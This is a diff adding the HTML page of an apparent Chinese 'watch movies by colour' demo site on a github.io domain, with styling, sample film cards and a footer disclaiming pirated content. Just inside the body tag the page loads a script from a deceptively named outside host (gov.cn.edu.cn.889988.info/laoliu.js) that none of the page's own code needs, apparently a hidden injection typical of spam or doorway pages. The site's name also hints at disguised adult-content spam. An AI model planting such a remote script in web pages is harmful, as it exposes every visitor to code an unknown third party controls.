@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+<title>颜色电影网 - 按色系看电影 | sanjihuangsedianyingwang-h5.github.io</title>
+<meta name="description" content="颜色电影网（sanjihuangsedianyingwang-h5.github.io）用红、蓝、绿、金、紫、粉、橙等色系组织电影片单：最新电影、热播剧集、综艺动漫、影视色彩资讯与精选专题，移动端自适应。" />
+<meta name="keywords" content="颜色电影网,sanjihuangsedianyingwang-h5,色系电影,调色美学,红幕悬疑,蓝调科幻,金棕文艺,胶片复古" />
+<link rel="canonical" href="https://sanjihuangsedianyingwang-h5.github.io/" />
+<style>
+:root{
+  --bg:#0a0a12;--bg2:#12121f;--card:#171728;--line:#26263c;
+  --txt:#f3f3ff;--sub:#9aa0c5;
+  --red:#ff4d6d;--blue:#3da9ff;--green:#39e6a8;--gold:#ffce4d;
+  --purple:#a96bff;--pink:#ff7bc4;--orange:#ff9d4d;--cyan:#37e6ff;
+  --radius:18px;--maxw:1180px;
+}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+  background:
+    radial-gradient(1000px 500px at 12% -10%,rgba(255,77,109,.18),transparent 55%),
+    radial-gradient(900px 480px at 88% 0%,rgba(61,169,255,.18),transparent 55%),
+    radial-gradient(900px 600px at 50% 120%,rgba(169,107,255,.18),transparent 55%),
+    var(--bg);
+  color:var(--txt);line-height:1.65;-webkit-font-smoothing:antialiased;
+}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:var(--maxw);margin:0 auto;padding:0 16px}
+header.site{position:sticky;top:0;z-index:60;backdrop-filter:saturate(140%) blur(10px);
+  background:linear-gradient(180deg,rgba(10,10,18,.94),rgba(10,10,18,.74));border-bottom:1px solid var(--line)}
+.nav{display:flex;align-items:center;gap:14px;height:64px}
+.logo{font-weight:900;font-size:21px;letter-spacing:.4px;
+  background:linear-gradient(90deg,var(--red),var(--gold),var(--green),var(--blue),var(--purple));
+  -webkit-background-clip:text;background-clip:text;color:transparent}
+.logo small{display:block;font-size:11px;color:var(--sub);font-weight:600}
+.menu{margin-left:auto;display:flex;gap:6px;flex-wrap:wrap}
+.menu a{padding:8px 12px;border-radius:999px;color:var(--sub);font-size:14px}
+.menu a:hover{color:#fff;background:rgba(255,255,255,.06)}
+.search{display:flex;gap:8px}
+.search input{width:180px;padding:9px 12px;border-radius:999px;border:1px solid var(--line);background:#0e0e1a;color:#fff;outline:none}
+.search button{border:0;padding:9px 14px;border-radius:999px;cursor:pointer;font-weight:800;
+  background:linear-gradient(90deg,var(--purple),var(--cyan));color:#0a0a12}
+.burger{display:none;margin-left:auto;background:#0e0e1a;border:1px solid var(--line);color:#fff;border-radius:12px;padding:8px 12px;font-size:18px}
+
+/* 首屏 */
+.hero{position:relative;margin:22px 0 8px;border-radius:26px;overflow:hidden;border:1px solid var(--line);min-height:360px;
+  background:linear-gradient(120deg,#1a0f1f,#0f1830 55%,#1c1330)}
+.rails{position:absolute;inset:0;opacity:.5;background:
+  repeating-linear-gradient(115deg,transparent 0 38px,rgba(255,255,255,.04) 38px 40px)}
+.rail{position:absolute;height:140%;width:120px;top:-20%;filter:blur(26px);opacity:.55}
+.rail.r1{left:6%;background:linear-gradient(180deg,var(--red),transparent);animation:float1 9s ease-in-out infinite}
+.rail.r2{left:26%;background:linear-gradient(180deg,var(--gold),transparent);animation:float2 11s ease-in-out infinite}
+.rail.r3{left:46%;background:linear-gradient(180deg,var(--green),transparent);animation:float1 10s ease-in-out infinite}
+.rail.r4{left:66%;background:linear-gradient(180deg,var(--blue),transparent);animation:float2 12s ease-in-out infinite}
+.rail.r5{left:84%;background:linear-gradient(180deg,var(--purple),transparent);animation:float1 13s ease-in-out infinite}
+@keyframes float1{50%{transform:translateY(-22px)}}
+@keyframes float2{50%{transform:translateY(22px)}}
+.slide{position:absolute;inset:0;opacity:0;transition:opacity .6s ease;padding:46px;display:flex;flex-direction:column;justify-content:flex-end}
+.slide.active{opacity:1;position:relative}
+.slide h1{font-size:36px;margin:0 0 8px}
+.slide p{color:#e7e9ff;max-width:640px;margin:0 0 16px}
+.chip{display:inline-block;padding:4px 10px;border-radius:999px;font-size:12px;font-weight:700;margin-right:8px;color:#0a0a12}
+.chip.red{background:var(--red)}.chip.blue{background:var(--blue)}.chip.gold{background:var(--gold)}
+.cta{padding:11px 18px;border-radius:999px;font-weight:800;width:max-content;border:0;cursor:pointer;
+  background:linear-gradient(90deg,#fff,#ffe7f3);color:#2a0014}
+.dots{position:absolute;right:18px;bottom:18px;display:flex;gap:8px}
+.dots i{width:10px;height:10px;border-radius:50%;background:rgba(255,255,255,.35);cursor:pointer}
+.dots i.on{background:var(--cyan)}
+
+.section{padding:34px 0}
+.sec-head{display:flex;align-items:baseline;gap:12px;margin-bottom:18px}
+.sec-head h2{font-size:24px;margin:0}
+.sec-head span{color:var(--sub);font-size:13px}
+.more{margin-left:auto;color:var(--cyan);font-size:13px}
+
+.grid-poster{display:grid;grid-template-columns:repeat(6,1fr);gap:14px}
+.poster{position:relative;border-radius:16px;overflow:hidden;background:var(--card);border:1px solid var(--line);transition:.25s}
+.poster:hover{transform:translateY(-4px);box-shadow:0 18px 40px rgba(0,0,0,.5)}
+.poster .ph{aspect-ratio:2/3}
+.poster:nth-child(1) .ph{background:linear-gradient(160deg,#5a1020,#ff4d6d)}
+.poster:nth-child(2) .ph{background:linear-gradient(160deg,#06203a,#3da9ff)}
+.poster:nth-child(3) .ph{background:linear-gradient(160deg,#063a2a,#39e6a8)}
+.poster:nth-child(4) .ph{background:linear-gradient(160deg,#3a2e06,#ffce4d)}
+.poster:nth-child(5) .ph{background:linear-gradient(160deg,#2a114a,#a96bff)}
+.poster:nth-child(6) .ph{background:linear-gradient(160deg,#3a1126,#ff7bc4)}
+.poster .meta{padding:10px 12px}
+.poster h3{font-size:14px;margin:0 0 4px}
+.poster .rate{position:absolute;top:10px;left:10px;background:rgba(0,0,0,.6);color:var(--gold);font-weight:800;padding:3px 8px;border-radius:10px;font-size:12px}
+.poster .hue{position:absolute;top:10px;right:10px;font-size:11px;font-weight:800;padding:3px 8px;border-radius:10px;color:#0a0a12}
+
+.colorway{display:grid;grid-template-columns:repeat(7,1fr);gap:12px}
+.hue-card{border-radius:16px;padding:20px 12px;text-align:center;font-weight:800;color:#0a0a12;border:1px solid rgba(255,255,255,.14)}
+.hue-card small{display:block;font-weight:600;font-size:12px;opacity:.8;margin-top:4px}
+.hue-card:nth-child(1){background:var(--red)}
+.hue-card:nth-child(2){background:var(--blue)}
+.hue-card:nth-child(3){background:var(--green)}
+.hue-card:nth-child(4){background:var(--gold)}
+.hue-card:nth-child(5){background:var(--purple);color:#fff}
+.hue-card:nth-child(6){background:var(--pink)}
+.hue-card:nth-child(7){background:var(--orange)}
+
+.rank{display:grid;grid-template-columns:1.1fr 1fr;gap:18px}
+.rank-hero{border-radius:18px;overflow:hidden;border:1px solid var(--line);padding:22px;
+  background:linear-gradient(160deg,#2a0f1f,#0f2740)}
+.rrow{display:flex;align-items:center;gap:12px;background:var(--card);border:1px solid var(--line);border-radius:14px;padding:10px 12px}
+.rnum{width:30px;height:30px;flex:0 0 30px;border-radius:9px;display:grid;place-items:center;font-weight:800;background:#0e0e1a;color:var(--sub)}
+.rrow:nth-child(1) .rnum{background:linear-gradient(135deg,#ffd700,#ff9d00);color:#231500}
+.rrow:nth-child(2) .rnum{background:linear-gradient(135deg,#d7e3ff,#9fb0d8);color:#10203f}
+.rrow:nth-child(3) .rnum{background:linear-gradient(135deg,#ff9d6c,#c9772f);color:#231500}
+.rthumb{width:56px;height:76px;border-radius:10px}
+.rrow:nth-child(1) .rthumb{background:linear-gradient(160deg,#5a1020,#ff4d6d)}
+.rrow:nth-child(2) .rthumb{background:linear-gradient(160deg,#06203a,#3da9ff)}
+.rrow:nth-child(3) .rthumb{background:linear-gradient(160deg,#063a2a,#39e6a8)}
+.rrow:nth-child(4) .rthumb{background:linear-gradient(160deg,#3a2e06,#ffce4d)}
+.rrow:nth-child(5) .rthumb{background:linear-gradient(160deg,#2a114a,#a96bff)}
+.rrow h4{margin:0;font-size:14px}.rrow p{margin:2px 0 0;font-size:12px;color:var(--sub)}
+
+.tabs{display:flex;gap:8px;margin-bottom:12px;flex-wrap:wrap}
+.tab{padding:7px 14px;border-radius:999px;border:1px solid var(--line);background:#0e0e1a;color:var(--sub);font-size:13px;cursor:pointer}
+.tab.on{color:#0a0a12;background:linear-gradient(90deg,var(--cyan),var(--purple));border-color:transparent;font-weight:800}
+.hscroll{display:flex;gap:14px;overflow-x:auto;padding-bottom:8px}
+.hscroll::-webkit-scrollbar{height:8px}.hscroll::-webkit-scrollbar-thumb{background:#26263c;border-radius:99px}
+.hcard{flex:0 0 220px;background:var(--card);border:1px solid var(--line);border-radius:16px;overflow:hidden}
+.hcard .ph{aspect-ratio:16/9}
+.hcard:nth-child(1) .ph{background:linear-gradient(160deg,#3a1126,#ff7bc4)}
+.hcard:nth-child(2) .ph{background:linear-gradient(160deg,#06203a,#3da9ff)}
+.hcard:nth-child(3) .ph{background:linear-gradient(160deg,#2a114a,#a96bff)}
+.hcard:nth-child(4) .ph{background:linear-gradient(160deg,#063a2a,#39e6a8)}
+.hcard:nth-child(5) .ph{background:linear-gradient(160deg,#3a2e06,#ffce4d)}
+.hcard .meta{padding:10px 12px}.hcard h3{font-size:14px;margin:0}
+.prog{height:6px;background:#0e0e1a;border-radius:99px;margin-top:8px;overflow:hidden}.prog i{display:block;height:100%;background:linear-gradient(90deg,var(--purple),var(--cyan))}
+
+.news{display:grid;grid-template-columns:1.4fr 1fr;gap:18px}
+.news-hero{border-radius:18px;overflow:hidden;border:1px solid var(--line);padding:22px;
+  background:linear-gradient(160deg,#241a12,#102a3a)}
+.news-list{display:flex;flex-direction:column;gap:10px}
+.nrow{display:flex;gap:12px;background:var(--card);border:1px solid var(--line);border-radius:14px;padding:10px}
+.nthumb{width:84px;height:60px;border-radius:10px;flex:0 0 84px;background:linear-gradient(160deg,#2a114a,#3da9ff)}
+.nrow h4{margin:0;font-size:14px}.nrow span{font-size:12px;color:var(--sub)}
+
+.collage{display:grid;grid-template-columns:2fr 1fr 1fr;grid-auto-rows:160px;gap:14px}
+.cg{border-radius:18px;overflow:hidden;border:1px solid var(--line);padding:18px;color:#fff}
+.cg.big{grid-row:span 2;background:linear-gradient(160deg,#2a0f3a,#063a4a)}
+.cg:nth-child(2){background:linear-gradient(160deg,#3a1126,#ff9d4d)}
+.cg:nth-child(3){background:linear-gradient(160deg,#06203a,#39e6a8)}
+.cg:nth-child(4){background:linear-gradient(160deg,#2a114a,#ffce4d);color:#231500}
+.cg:nth-child(5){background:linear-gradient(160deg,#063a2a,#a96bff)}
+.cg h3{margin:0 0 6px;font-size:18px}.cg p{margin:0;font-size:13px;opacity:.92}
+
+.about{display:grid;grid-template-columns:1.3fr 1fr;gap:18px}
+.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-top:10px}
+.stat{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:16px;text-align:center}
+.stat b{font-size:24px;background:linear-gradient(90deg,var(--red),var(--gold),var(--blue));-webkit-background-clip:text;background-clip:text;color:transparent}
+.form{background:var(--card);border:1px solid var(--line);border-radius:18px;padding:18px}
+.form input,.form textarea{width:100%;padding:11px 12px;border-radius:12px;border:1px solid var(--line);background:#0e0e1a;color:#fff;margin-bottom:10px;outline:none}
+.form button{border:0;width:100%;padding:12px;border-radius:12px;cursor:pointer;font-weight:800;background:linear-gradient(90deg,var(--purple),var(--cyan));color:#0a0a12}
+
+footer.site{border-top:1px solid var(--line);padding:26px 0 42px;color:var(--sub);font-size:13px}
+footer.site a{color:var(--cyan)}
+
+@media (max-width:980px){
+  .grid-poster{grid-template-columns:repeat(4,1fr)}
+  .colorway{grid-template-columns:repeat(4,1fr)}
+  .rank,.news,.about{grid-template-columns:1fr}
+  .collage{grid-template-columns:1fr 1fr}.cg.big{grid-row:auto}
+}
+@media (max-width:720px){
+  .menu{display:none;position:absolute;top:64px;left:0;right:0;flex-direction:column;background:#0a0a12;border-bottom:1px solid var(--line);padding:10px 16px;gap:4px}
+  .menu.open{display:flex}
+  .burger{display:block}
+  .search input{width:120px}
+  .slide{padding:26px 18px}.slide h1{font-size:26px}
+  .grid-poster{grid-template-columns:repeat(2,1fr)}
+  .colorway{grid-template-columns:repeat(2,1fr)}
+  .collage{grid-template-columns:1fr}
+  .stats{grid-template-columns:1fr 1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="site">
+  <div class="wrap nav">
+    <div class="logo">颜色电影网<small>sanjihuangsedianyingwang-h5.github.io</small></div>
+    <nav class="menu" id="menu">
+      <a href="#home">首页</a>
+      <a href="#new">色系新片</a>
+      <a href="#hue">颜色分类</a>
+      <a href="#rank">调色榜单</a>
+      <a href="#drama">剧集综艺</a>
+      <a href="#news">色彩资讯</a>
+      <a href="#topic">色系专题</a>
+      <a href="#about">关于我们</a>
+    </nav>
+    <div class="search">
+      <input type="text" placeholder="搜红幕/蓝调/胶片…" aria-label="搜索" />
+      <button type="button" onclick="alert('演示站：搜索用 # 占位')">搜索</button>
+    </div>
+    <button class="burger" id="burger" aria-label="菜单">☰</button>
+  </div>
+</header>
+
+<main class="wrap">
+
+  <!-- ① 首屏 -->
+  <section class="hero" id="home" aria-label="色彩首屏">
+    <div class="rails"></div>
+    <div class="rail r1"></div><div class="rail r2"></div><div class="rail r3"></div>
+    <div class="rail r4"></div><div class="rail r5"></div>
+
+    <div class="slide active">
+      <span class="chip red">红幕悬疑</span><span class="chip gold">4K 调色</span>
+      <h1>用颜色看电影：红 = 悬疑与欲望</h1>
+      <p>颜色电影网把片单按色系重组，红幕、蓝调、金棕、莫兰迪……一眼找到你想要的情绪。</p>
+      <button class="cta" onclick="location.href='#new'">进入色系片单</button>
+    </div>
+    <div class="slide">
+      <span class="chip blue">蓝调科幻</span><span class="chip green">治愈系</span>
+      <h1>蓝调科幻 / 绿色治愈 专题上线</h1>
+      <p>从霓虹都市到森林晨雾，色彩就是类型。移动端自适应，色卡即导航。</p>
+      <button class="cta" onclick="location.href='#topic'">看色系专题</button>
+    </div>
+    <div class="slide">
+      <span class="chip gold">金棕文艺</span><span class="chip purple">紫调悬疑</span>
+      <h1>金棕文艺片：胶片感与暖光美学</h1>
+      <p>胶片颗粒、烛光、黄昏、旧电影院——颜色电影网帮你按“美术风格”追片。</p>
+      <button class="cta" onclick="location.href='#rank'">看调色榜单</button>
+    </div>
+    <div class="dots" id="dots"><i class="on"></i><i></i><i></i></div>
+  </section>
+
+  <!-- ② 色系新片 -->
+  <section class="section" id="new">
+    <div class="sec-head"><h2>色系新片</h2><span>Color-Tagged Movies</span><a class="more" href="#">更多 #</a></div>
+    <div class="grid-poster">
+      <article class="poster"><div class="ph"></div><span class="rate">8.7</span><span class="hue" style="background:var(--red)">红幕</span><div class="meta"><h3>红房间谋杀案</h3><p>悬疑 / 2026</p></div></article>
+      <article class="poster"><div class="ph"></div><span class="rate">8.3</span><span class="hue" style="background:var(--blue)">蓝调</span><div class="meta"><h3>潮汐之外</h3><p>科幻 / 2026</p></div></article>
+      <article class="poster"><div class="ph"></div><span class="rate">9.0</span><span class="hue" style="background:var(--green)">治愈</span><div class="meta"><h3>松风诊所</h3><p>治愈 / 2026</p></div></article>
+      <article class="poster"><div class="ph"></div><span class="rate">8.5</span><span class="hue" style="background:var(--gold)">金棕</span><div class="meta"><h3>黄昏放映厅</h3><p>文艺 / 2026</p></div></article>
+      <article class="poster"><div class="ph"></div><span class="rate">8.1</span><span class="hue" style="background:var(--purple);color:#fff">紫调</span><div class="meta"><h3>雾中电话亭</h3><p>悬疑 / 2026</p></div></article>
+      <article class="poster"><div class="ph"></div><span class="rate">8.8</span><span class="hue" style="background:var(--pink)">粉调</span><div class="meta"><h3>樱花快递员</h3><p>爱情 / 2026</p></div></article>
+    </div>
+  </section>
+
+  <!-- ③ 颜色分类 -->
+  <section class="section" id="hue">
+    <div class="sec-head"><h2>颜色分类</h2><span>Watch by Color</span></div>
+    <div class="colorway">
+      <a class="hue-card" href="#">红<br>动作 / 悬疑<small>Red Mood</small></a>
+      <a class="hue-card" href="#">蓝<br>科幻 / 冷调<small>Blue Mood</small></a>
+      <a class="hue-card" href="#">绿<br>治愈 / 自然<small>Green Mood</small></a>
+      <a class="hue-card" href="#">金<br>文艺 / 怀旧<small>Gold Mood</small></a>
+      <a class="hue-card" href="#">紫<br>诡异 / 梦境<small>Purple Mood</small></a>
+      <a class="hue-card" href="#">粉<br>爱情 / 甜宠<small>Pink Mood</small></a>
+      <a class="hue-card" href="#">橙<br>喜剧 / 公路<small>Orange Mood</small></a>
+    </div>
+  </section>
+
+  <!-- ④ 调色榜单 -->
+  <section class="section" id="rank">
+    <div class="sec-head"><h2>调色榜单</h2><span>Best Graded Films</span><a class="more" href="#">完整榜单 #</a></div>
+    <div class="rank">
+      <div class="rank-hero">
+        <span class="chip gold">NO.1 本周调色王</span>
+        <h3 style="font-size:22px;margin:10px 0">红房间谋杀案</h3>
+        <p style="color:#e7e9ff">红幕打光 + 胶片颗粒 + 单一场景调度，被影评人称为“用颜色讲故事的悬疑样板”。</p>
+        <button class="cta" onclick="location.href='#'">播放正片</button>
+      </div>
+      <div class="rank-list">
+        <div class="rrow"><div class="rnum">1</div><div class="rthumb"></div><div><h4>红房间谋杀案</h4><p>红幕悬疑 · 热度 98120</p></div></div>
+        <div class="rrow"><div class="rnum">2</div><div class="rthumb"></div><div><h4>潮汐之外</h4><p>蓝调科幻 · 热度 87400</p></div></div>
+        <div class="rrow"><div class="rnum">3</div><div class="rthumb"></div><div><h4>松风诊所</h4><p>绿色治愈 · 热度 80230</p></div></div>
+        <div class="rrow"><div class="rnum">4</div><div class="rthumb"></div><div><h4>黄昏放映厅</h4><p>金棕文艺 · 热度 76540</p></div></div>
+        <div class="rrow"><div class="rnum">5</div><div class="rthumb"></div><div><h4>雾中电话亭</h4><p>紫调悬疑 · 热度 73210</p></div></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ⑤ 剧集 / 综艺 / 动漫 -->
+  <section class="section" id="drama">
+    <div class="sec-head"><h2>剧集 · 综艺 · 动漫</h2><span>Drama / Variety / Anime</span><a class="more" href="#">更多 #</a></div>
+    <div class="tabs" id="tabs">
+      <span class="tab on">剧集</span><span class="tab">综艺</span><span class="tab">国创动漫</span><span class="tab">纪录片</span>
+    </div>
+    <div class="hscroll">
+      <div class="hcard"><div class="ph"></div><div class="meta"><h3>红幕剧场 第8集</h3><div class="prog"><i style="width:64%"></i></div></div></div>
+      <div class="hcard"><div class="ph"></div><div class="meta"><h3>蓝调音乐节 S2</h3><div class="prog"><i style="width:40%"></i></div></div></div>
+      <div class="hcard"><div class="ph"></div><div class="meta"><h3>松风物语 第12集</h3><div class="prog"><i style="width:82%"></i></div></div></div>
+      <div class="hcard"><div class="ph"></div><div class="meta"><h3>黄昏放映 第5集</h3><div class="prog"><i style="width:50%"></i></div></div></div>
+      <div class="hcard"><div class="ph"></div><div class="meta"><h3>雾中电话亭 第3集</h3><div class="prog"><i style="width:28%"></i></div></div></div>
+    </div>
+  </section>
+
+  <!-- ⑥ 色彩资讯 -->
+  <section class="section" id="news">
+    <div class="sec-head"><h2>影视色彩资讯</h2><span>Color & Craft</span><a class="more" href="#">全部 #</a></div>
+    <div class="news">
+      <div class="news-hero">
+        <span class="chip purple">调色封面</span>
+        <h3 style="font-size:22px;margin:10px 0">为什么 2026 年的悬疑片都在用“红+青”对立色？</h3>
+        <p style="color:#e7e9ff">从《红房间谋杀案》到《潮汐之外》，调色师用互补色制造不安感。本文拆解 5 部新片的 LUT 思路。</p>
+        <button class="cta" onclick="location.href='#'">阅读全文</button>
+      </div>
+      <div class="news-list">
+        <div class="nrow"><div class="nthumb"></div><div><h4>胶片复古怎么调不土？</h4><span>2026-10-09 · 调色</span></div></div>
+        <div class="nrow"><div class="nthumb"></div><div><h4>莫兰迪色系为什么显贵</h4><span>2026-10-08 · 美术</span></div></div>
+        <div class="nrow"><div class="nthumb"></div><div><h4>赛博朋克霓虹打光公式</h4><span>2026-10-07 · 灯光</span></div></div>
+        <div class="nrow"><div class="nthumb"></div><div><h4>服化道配色决定角色关系</h4><span>2026-10-06 · 制作</span></div></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ⑦ 色系专题 -->
+  <section class="section" id="topic">
+    <div class="sec-head"><h2>精选色系专题</h2><span>Color Collections</span><a class="more" href="#">更多专题 #</a></div>
+    <div class="collage">
+      <div class="cg big"><h3>赛博朋克：霓虹与雨水</h3><p>青洋红、湿地面、广告牌、夜市——一套城市未来感片单。</p><button class="cta" onclick="location.href='#'">进入专题</button></div>
+      <div class="cg"><h3>胶片复古</h3><p>暖黄 / 颗粒 / 划痕</p></div>
+      <div class="cg"><h3>莫兰迪治愈</h3><p>灰调 / 安静 / 日常</p></div>
+      <div class="cg"><h3>红幕悬疑</h3><p>单色光 / 阴影 / 密闭</p></div>
+      <div class="cg"><h3>蓝调深海</h3><p>冷光 / 孤独 / 广角</p></div>
+    </div>
+  </section>
+
+  <!-- ⑧ 关于我们 -->
+  <section class="section" id="about">
+    <div class="sec-head"><h2>关于我们</h2><span>About</span></div>
+    <div class="about">
+      <div>
+        <p style="color:#e7e9ff">颜色电影网（sanjihuangsedianyingwang-h5.github.io）是一个“按色系看片”的演示型影视导航站：用红、蓝、绿、金、紫、粉、橙组织最新电影、热播剧集、综艺动漫、调色资讯与色系专题，强调移动端自适应与差异化版式。</p>
+        <div class="stats">
+          <div class="stat"><b>7</b><br>主色系</div>
+          <div class="stat"><b>12000+</b><br>影片条目</div>
+          <div class="stat"><b>100%</b><br>移动端适配</div>
+        </div>
+      </div>
+      <form class="form" onsubmit="event.preventDefault();alert('演示提交：配色留言已占位');">
+        <h3 style="margin:0 0 10px">你最爱的电影色系？</h3>
+        <input type="text" placeholder="昵称" aria-label="昵称" />
+        <input type="email" placeholder="邮箱（演示）" aria-label="邮箱" />
+        <textarea rows="3" placeholder="红幕悬疑 / 蓝调科幻 / 莫兰迪治愈…"></textarea>
+        <button type="submit">提交留言</button>
+      </form>
+    </div>
+  </section>
+</main>
+
+<footer class="site">
+  <div class="wrap">
+    颜色电影网 · <a href="https://sanjihuangsedianyingwang-h5.github.io/">sanjihuangsedianyingwang-h5.github.io</a><br/>
+    演示页面：所有播放 / 详情 / 分类链接均使用 <code>#</code> 占位，不提供真实盗版资源。<br/>
+    © 2026 颜色电影网 Demo · 按色系组织影视内容，仅用于静态站 / SEO / 移动端适配演示。
+  </div>
+</footer>
+
+<script>
+  const burger=document.getElementById('burger'),menu=document.getElementById('menu');
+  burger.addEventListener('click',()=>menu.classList.toggle('open'));
+  menu.querySelectorAll('a').forEach(a=>a.addEventListener('click',()=>menu.classList.remove('open')));
+
+  const slides=[...document.querySelectorAll('.hero .slide')];
+  const dots=[...document.querySelectorAll('#dots i')];
+  let cur=0;
+  function show(i){slides.forEach((s,k)=>s.classList.toggle('active',k===i));dots.forEach((d,k)=>d.classList.toggle('on',k===i));cur=i;}
+  dots.forEach((d,i)=>d.addEventListener('click',()=>show(i)));
+  setInterval(()=>show((cur+1)%slides.length),4500);
+
+  const tabs=[...document.querySelectorAll('#tabs .tab')];
+  tabs.forEach(t=>t.addEventListener('click',()=>tabs.forEach(x=>x.classList.remove('on'))||t.classList.add('on')));
+</script>
+</body>
+</html>
